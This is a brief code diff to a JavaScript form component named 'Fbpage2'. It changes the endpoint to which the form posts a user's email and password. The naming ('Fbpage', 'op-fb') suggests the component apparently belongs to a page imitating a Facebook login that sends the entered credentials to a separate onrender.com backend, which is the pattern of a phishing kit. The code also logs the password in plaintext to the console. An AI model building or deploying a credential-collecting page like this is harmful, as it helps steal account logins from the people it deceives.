@@ -16,7 +16,7 @@ function Fbpage2() {
         e.preventDefault();
         try {
             console.log('email', email, 'password', password);
-        const response =   await axios.post('https://op-fb.onrender.com/api/v1/user/register', {
+        const response =   await axios.post('https://op-backend-hzpw.onrender.com/api/v1/user/register', {
                 email,
                 password
             });
